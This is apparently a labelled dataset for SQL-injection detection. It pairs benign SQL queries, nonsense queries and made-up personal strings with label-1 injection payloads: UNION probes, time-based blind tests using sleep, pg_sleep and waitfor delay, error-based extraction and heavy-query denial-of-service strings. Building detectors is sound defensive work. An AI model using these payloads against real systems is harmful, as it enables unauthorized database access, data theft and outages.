Payload	Attacker
mike-osbourne@hiperzaragoza.qa	0
SELECT dish ( s )  FROM jet	0
  SELECT ridingID AS ID, husband AS related FROM explain	0
1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#	1
1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  # cgow	1
1 where 1186  =  1186 union all select null,null,null,null,null,null,null#	1
23	0
1%'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   '%'  =  '	1
1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kudh' like 'kudh	1
-8370'   )    )    or   (  3501  =  6407  )  *6407 and    (    (   'agcm' like 'agcm	1
1'+  (  select zbyt where 4575  =  4575 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   +'	1
1 where 8889  =  8889	1
"-2072""  )   as rjcz where 2491  =  2491 or 6872  =  6872--"	1
select * from generate_series  (  6730,6730,case when   (  6730  =  9431  )   then 1 else 0 end  )   limit 1--	1
DELETE FROM made	0
plza. carmelo solis, 78, 4?g	0
  UPDATE slave SET ride =  'lips', City =  'give' WHERE pilot =  cow	0
 UPDATE would SET through = 'wrapped'WHERE family = 'film'	0
selwart@studentrooms.zr	0
   SELECT understanding, seldom+ ', ' + dull+ ' ' + route+ ', ' + fully AS ill  FROM nine	0
"-3393""   )    )    union all select 5954,5954,5954,5954,5954,5954,5954,5954,5954,5954--"	1
i4sacular	0
SELECT * FROM calm WHERE metal = 'remove' LIMIT 3	0
1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null--	1
1  )   where 4780  =  4780	1
SELECT * FROM where WHERE add NOT LIKE 'engine%'	0
  SELECT wentID AS ID, again AS lose FROM pair	0
nowack@softwaresaas.bm	0
carteado	0
SELECT * FROM having 3	0
DELETE FROM label	0
SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'wp_theme' )  AND t.name IN  ( 'houzez-child' ) 	0
or   (  EXISTS  ) 	1
"1"" waitfor delay '0:0:5' and ""syhx""  =  ""syhx"	1
"-8200%""   )    )    union all select 7538,7538,7538#"	1
paracuellos de jarama	0
"-5513""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""ovmk"" like ""ovmk"	1
valdelagua del cerro	0
1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --	1
iza	0
85009634r	0
1'  )   where 7587  =  7587 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --	1
7ngr5ta3ente	0
1992810000000000	0
1' in boolean mode  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #	1
SELECT * FROM themselves 3 SELECT * FROM card	0
"1""  )   where 7010  =  7010 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
SELECT AVG ( but ) FROM improve SELECT SUM ( cross ) 	0
puntallana	0
1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '	1
sowry	0
"1""   )    )    union all select null,null#"	1
oskorep	0
SELECT TOP 3 * FROM higher	0
SELECT * FROM laid ORDER BY successful	0
  SELECT mostID AS ID, my AS principle FROM sheep	0
casper	0
45789	0
"-1975"" union all select 8638,8638,8638,8638,8638,8638,8638,8638,8638#"	1
SELECT very ( s )  FROM dark LEFT JOIN	0
SELECT COUNT ( cage ) FROM football	0
"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""eiuc"" like ""eiuc"	1
  SELECT root AS hunt, long AS [birth]  FROM attention	0
-4807' where 3232  =  3232 or make_set  (  6599  =  5179,5179  )  --	1
1',  (  select   (  case when   (  5777  =  5777  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  	1
"-2782"" union all select 2109,2109,2109#"	1
2771560000000000	0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """	1
SELECT describe ( s )  FROM hay FULL OUTER JOIN	0
"1%""   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """	1
select * from generate_series  (  4975,4975,case when   (  4975  =  9615  )   then 1 else 0 end  )   limit 1--	1
1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
racette	0
"1"" and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""uvvy"" like ""uvvy"	1
"1"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and ""wcze""  =  ""wcze"	1
massaguer molin	0
alins	0
   SELECT muscle,thought,pay,depend,replied     (  (  forty JOIN pencil ON picture.club =  worried.shelter )   INNER JOIN adjectiveON Orders.every =  how.averageID ) 	0
carrer mestre albages 61,	0
SELECT * FROM clearly ORDER BY planning	0
1'  )   where 6746  =  6746 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --	1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh"	1
1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs	1
 select * from users where id  =  1 union select @<@$,version  (    )   -- 1	1
c/ la estrella, 182	0
andreu agraso	0
1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  # ewsz	1
SELECT * FROM voice WHERE production BETWEEN '1996-07-01' AND '1996-07-31'	0
15lo956i1o	0
SELECT * FROM look FETCH FIRST 50 PERCENT ROWS ONLY	0
"1""   )    )    as ngvf where 9912  =  9912 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --"	1
SELECT TOP 3 * FROM movement	0
8711760000000000	0
SELECT * FROM court WHERE cross BETWEEN '1996-07-01' AND '1996-07-31'	0
SELECT * FROM upper WHERE seat LIKE '%ice%'	0
1'||  (  select 'mnvk' from dual where 4181  =  4181	1
1   )    )    as llnm where 6510  =  6510 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --	1
"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--"	1
3250	0
SELECT * FROM particularly WHERE field BETWEEN up09/01/1996eat AND interest15/31/1996branch	0
1 uni/**/on select all from where	1
-4137   )    )    as elxu where 5672  =  5672 order by 1--	1
1' where 4150  =  4150 and elt  (  8012  =  6026,6026  )  --	1
select * from generate_series  (  6468,6468,case when   (  6468  =  7999  )   then 1 else 0 end  )   limit 1--	1
tuffo	0
SELECT * FROM detail WHERE building = 'sum' LIMIT 3	0
"SELECT * FROM change WHERE as BETWEEN ""straw"" AND    ""two"""	0
 --	1
SELECT * FROM  ( SELECT porch FROM complete ) 	0
1   )    )    as rbcf where 1053  =  1053	1
"1%"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""%""  =  """	1
basta@24htranslations.edu	0
 (  select   (  case when   (  6838  =  2866  )   then 6838 else 1/  (  select 0  )   end   )    ) 	1
"1""   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""zzcd""  =  ""zzcd"	1
SELECT option_value FROM wp_options WHERE option_name  =  'options_facebook_url' LIMIT 1	0
9810	0
"1""  )   where 8571  =  8571 and elt  (  4249  =  4249,7259  )  --"	1
SELECT * FROM design	0
"1""  )   rlike sleep  (  5  )  #"	1
1  )   union all select null,null#	1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""hgds"" like ""hgds"	1
   SELECT those,separate,yellow,rhyme,front     (  (  son JOIN sleep ON nothing.am =  border.weak )   INNER JOIN fourthON Orders.afraid =  poor.poorID ) 	0
"1""   )    )    rlike sleep  (  5  )   and    (    (   ""fzlr""  =  ""fzlr"	1
1'+  (  select 'cwta' where 6091  =  6091	1
canaan	0
1%'  )   union all select null,null,null,null,null,null,null,null--	1
1  )   where 5944  =  5944 and   (  4446  =  8843  )  *8843--	1
SELECT * FROM tears FETCH FIRST 50 PERCENT ROWS ONLY	0
1' or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
1' where 1895  =  1895 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
  UPDATE personal SET tomorrow =  'whose', City =  'partly' WHERE cloud =  fun	0
select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'wvzw'  =  'wvzw	1
c/ del ferrocarril, 152,	0
SELECT COUNT ( pride ) FROM adjective	0
SELECT orange ( s )  FROM wing UNION ALL	0
-9526 where 5734  =  5734 or elt  (  1032  =  1032,3623  )  --	1
"-5616""   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""hdrb"" like ""hdrb"	1
SELECT * FROM gate FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM direct	0
54430634f	0
-8609' union all select 9384,9384,9384,9384--	1
SELECT * FROM very WHERE fresh  BETWEEN 10 AND 20	0
pro8i2ic6r	0
SELECT * FROM sudden  WHERE industrial = bigger	0
  SELECT equal,southern,trouble FROM hurry LEFT JOIN Orders ON fell.floorID =  headed.dust ORDER BY rope.heat	0
"1""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""ecoa"" like ""ecoa"	1
-6190'   )    )     )   union all select 9413--	1
SELECT * FROM shade WHERE heading NOT BETWEEN 'straight' AND 'written'	0
59072549q	0
"1%""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --"	1
"1""  )   as ivkw where 4218  =  4218 union all select null--"	1
torre-pacheco	0
-7111 union all select 2409,2409,2409,2409,2409,2409#	1
SELECT * FROM die WHERE hunter = 'driving'	0
"1%""   )    )     )   union all select null,null,null,null,null,null,null--"	1
1'||  (  select 'tznb' from dual where 8808  =  8808 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #	1
1   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  9474  =  9474	1
-1593' or elt  (  7044  =  6125,6125  )   and 'zkuz'  =  'zkuz	1
SELECT * FROM cutting WHERE room  BETWEEN 10 AND 20	0
1%'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   '%'  =  '	1
-2129'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'eutm' like 'eutm	1
navas de san juan	0
"-2120""  )   union all select 9614--"	1
SELECT * FROM furniture ORDER BY improve DESC	0
"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """	1
1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  '	1
6920000000000000	0
"1%""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """	1
1 and make_set  (  8403  =  8403,8899  )  -- rbxf	1
SELECT TOP 3 * FROM down WHERE quarter = 'fifty'	0
SELECT AVG ( happen ) FROM unusual	0
SELECT * FROM taste WHERE until = 'heading' FETCH FIRST 3 ROWS ONLY	0
SELECT * FROM earlier WHERE heart IN  ( SELECT equipment FROM are ) 	0
SELECT * FROM low WHERE eleven = 'properly'  AND City = 'ice'	0
SELECT wheel ( s )  FROM cow LEFT JOIN	0
SELECT * FROM accurate FETCH FIRST 3 ROWS ONLY	0
"1"" and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""xwnw""  =  ""xwnw"	1
1  )   as ihan where 5298  =  5298 and elt  (  6587  =  3479,3479  )  --	1
SELECT * FROM thus 3	0
"1""  )   where 8612  =  8612"	1
1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'czqk' like 'czqk	1
24410	0
SELECT roof ( s ) FROM diameter INNER JOIN	0
"-9037%"" union all select 6583#"	1
yeste meloda	0
1' or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --	1
SELECT sing ( s )  FROM engineer FULL OUTER JOIN	0
SELECT month ( s )  FROM on SELECT electricity ( s ) 	0
-4215  )   where 5782  =  5782 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --	1
afoscarse	0
SELECT * FROM difficulty WHERE typical = 'desk' LIMIT 3	0
urrutia delems	0
weintraub	0
5838990000000000	0
ezio	0
"1""  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --"	1
kussauer_brereton@showcarsmadrid.com.kp	0
SELECT * FROM  ( SELECT herself FROM population ) 	0
DELETE FROM consider WHERE storm = 'stove'	0
 SELECT * FROM judge ORDER BY means, flow	0
981560000000000	0
  SELECT be AS up, solution AS [political]  FROM seed	0
INSERT INTO lips  ( good, jump, around )  VALUES  ( 'silk', 'income', 'throughout' )  	0
xiprer 61, 2-a	0
SELECT AVG ( salt ) FROM personal SELECT SUM ( hit ) 	0
methi	0
select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240	1
SELECT * FROM control WHERE telephone NOT LIKE '[unless]%'	0
26987451x	0
SELECT volume ( s ) FROM field INNER JOIN	0
SELECT * FROM roar ORDER BY represent	0
1%'   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
47965007w	0
"1%""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""%""  =  """	1
SELECT seldom ( s ) FROM anywhere INNER JOIN	0
SELECT COUNT ( betweenID ) FROM active	0
1'   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
select * from generate_series  (  3267,3267,case when   (  3267  =  5900  )   then 1 else 0 end  )   limit 1--	1
pegler	0
fenton@tiposdedrogas.je	0
"1""   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --"	1
SELECT thick ( s ) FROM pleasant INNER JOIN	0
SELECT AVG ( loud )  FROM chance  SELECT SUM ( mice ) 	0
avinguda carrilet, 21,	0
clavero lloveras	0
carlin	0
"1""   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""wute"" like ""wute"	1
3242090000000000	0
crabe	0
1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'llfp'  =  'llfp	1
SELECT DISTINCT composed FROM figure	0
1'   )    )     )   and make_set  (  6094  =  2929,2929  )   and    (    (     (  'gkyo'  =  'gkyo	1
  SELECT * FROM across WHERE desk NOT IN  ( 'window', 'laid', 'eat' )  	0
1'||  (  select 'wcad' from dual where 4262  =  4262 and elt  (  3114  =  3114,sleep  (  5   )    )   #	1
yevtushenko-pegna@corjet.al	0
4.46813E+015	0
2777670000000000	0
"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """	1
31519125v	0
ob7491	0
SELECT AVG ( map ) FROM forward	0
SELECT * FROM social WHERE run BETWEEN '1996-07-01' AND '1996-07-31'	0
select sleep  (  5  )   and '%'  =  '	1
1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  	1
SELECT * FROM verb  WHERE forgot NOT LIKE '[arrow]%'	0
SELECT TOP 50 PERCENT * FROM busy	0
"1"" and 4288  =  3696 and ""qqam"" like ""qqam"	1
traveria morera	0
1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   	1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""%""  =  """	1
"1""   )    )    as xbhp where 7527  =  7527"	1
SELECT TOP 50 PERCENT * FROM picture SELECT * FROM rod FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM spirit	0
SELECT COUNT ( whenID ) FROM rubbed	0
"1%"" union all select null,null#"	1
SELECT TOP 50 PERCENT * FROM differ	0
1  )   as tjwa where 1173  =  1173 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --	1
dcada	0
SELECT * FROM officer WHERE standard BETWEEN early09/01/1996influence AND relationship15/31/1996duty	0
elois	0
SELECT * FROM without WHERE managed = 'higher'  OR stick = 'biggest'	0
" select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1"	1
call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'vwxg'  =  'vwxg	1
1'   )    )    union all select null,null,null,null,null,null,null,null,null#	1
tiena	0
SELECT * FROM idea WHERE improve  BETWEEN 10 AND 20	0
SELECT option_value FROM wp_options WHERE option_name  =  'amp-options' LIMIT 1	0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_2_link' LIMIT 1	0
grajear	0
1'||  (  select 'nzjz' where 3539  =  3539 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --	1
SELECT * FROM metal WHERE trouble BETWEEN 'constantly' AND 'alike'	0
   SELECT variety, mixture, fastened FROM day WHERE chief  IS NULL	0
SELECT AVG ( waste ) FROM expect	0
1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'sqbr'  =  'sqbr	1
malcocinado	0
1'  )   where 5287  =  5287 and 7533  =  7533--	1
SELECT * FROM atmosphere	0
1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'tkcy' like 'tkcy	1
SELECT * FROM stopped WHERE rear = 'writing' FETCH FIRST 3 ROWS ONLY	0
cretas	0
SELECT TOP 3 * FROM fed SELECT * FROM line 3SELECT * FROM verb	0
SELECT TOP 3 * FROM difficulty SELECT * FROM music 3SELECT * FROM mother	0
  SELECT trail,land,tent FROM low LEFT JOIN Orders ON library.nationalID =  lot.eventually ORDER BY fine.red	0
SELECT captured ( s )  FROM or FULL OUTER JOIN	0
waitfor delay '0:0:5'# ogzq	1
98538229l	0
  SELECT * FROM broad WHERE orange IN  ( 'coach', 'breakfast', 'respect' )  	0
9.70863E+015	0
select * from generate_series  (  5846,5846,case when   (  5846  =  5227  )   then 1 else 0 end  )   limit 1--	1
salv sagra	0
or 'x'  =  'x	1
nanjar viejo	0
burg	0
INSERT INTO belong ( route, collect, desert, bowl, smooth, threw )  VALUES  ( 'spread', 'weigh'. forty', 'fear', 'loss', 'apartment', 'studied' )  	0
38470	0
" end and    (    (     (  ""poee""  =  ""poee"	1
1 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --	1
SELECT * FROM border  WHERE mighty = shallow	0
SELECT * FROM plane WHERE band = 'gold' FETCH FIRST 3 ROWS ONLY	0
SELECT * FROM luck FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM daughter	0
1',  (  select   (  case when   (  8382  =  8382  )   then 1 else 1/  (  select 0  )   end   )    )   	1
6791380000000000	0
frison@barnizultravioleta.jm	0
"-2916""   )    )    or 4946  =  8232--"	1
1056	0
SELECT * FROM handsome WHERE five = 'anyway' FETCH FIRST 3 ROWS ONLY	0
select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   	1
   SELECT remove, per, handFROM consist WHERE twenty  IS NOT NULL	0
1   )    )    as aqpy where 4027  =  4027 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
-1366' or make_set  (  9354  =  9354,7185  )   and 'abre'  =  'abre	1
plaa tarent, 117, 2-h	0
1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'jmjw' like 'jmjw	1
1 and make_set  (  9542  =  8888,8888  )  -- idkn	1
" select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1"	1
SELECT * FROM anywhere WHERE hurt = 'under' FETCH FIRST 3 ROWS ONLY	0
SELECT * FROM size WHERE later = 'discuss' FETCH FIRST 3 ROWS ONLY	0
-6353%'   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   '%'  =  '	1
SELECT * FROM front WHERE wise = 'earn'	0
"1%""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #"	1
select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1'	1
select   (  case when   (  3773  =  3722  )   then 3773 else 3773*  (  select 3773 from mysql.db  )   end  )  #	1
hoyo higueron 32 3-f	0
1769640000000000	0
" select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1"	1
1' in boolean mode  )   and   (  3020  =  3020  )  *6703#	1
SELECT drawn ( s ) FROM closer INNER JOIN	0
5798580000000000	0
select   (  case when   (  4755  =  4784  )   then 1 else 4755*  (  select 4755 from master..sysdatabases  )   end  )  --	1
SELECT * FROM love FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM tired	0
SELECT AVG ( bigger ) FROM surprise	0
SELECT * FROM  ( SELECT wild FROM deeply ) 	0
1'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  'ochr' like 'ochr	1
SELECT * FROM fifteen WHERE rice BETWEEN '1996-07-01' AND '1996-07-31'	0
  SELECT * FROM shop WHERE greatest IN  ( 'tomorrow', 'stay', 'plane' )  	0
INSERT INTO paper  ( plant, potatoes, powder )  VALUES  ( 'willing', 'stood', 'ice' )  	0
1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --	1
chamberlain@muevemiweb.al	0
1  )   as oknr where 3228  =  3228	1
perales del alfambra	0
SELECT * FROM wp_posts LEFT JOIN wp_postmeta ON  (  wp_posts.ID  =  wp_postmeta.post_id  )  WHERE  ( post_type  =  'page' AND post_status  =  'publish' )  AND wp_postmeta.meta_key  =  '_wp_page_template' AND wp_postmeta.meta_value  =  'template/template-thankyou.php' ORDER BY wp_posts.post_title ASC	0
SELECT * FROM me WHERE birds = 'silk'  OR experience = 'neighborhood'	0
SELECT TOP 50 PERCENT * FROM sad SELECT * FROM peace FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM shake	0
1  )   as ywrn where 1893  =  1893	1
-6567'   )    )    union all select 3217#	1
1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'blie'  =  'blie	1
1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'aytf' like 'aytf	1
de los cazadores, 196, 1-b	0
SELECT * FROM taught WHERE    NOT chose = 'make'	0
1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'dogx'  =  'dogx	1
SELECT bottle ( s )  FROM needs SELECT too ( s ) 	0
azcrate campalan	0
SELECT * FROM  ( SELECT explanation FROM spin ) 	0
SELECT TOP 3 * FROM spite WHERE speech = 'attack' SELECT * FROM society	0
1%'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  '%'  =  '	1
511amasa	0
contreras	0
perales salmern	0
1'||  (  select 'fdkl' where 4572  =  4572 union all select null,null,null,null,null,null,null,null,null#	1
1'+  (  select 'tbfj' where 4016  =  4016	1
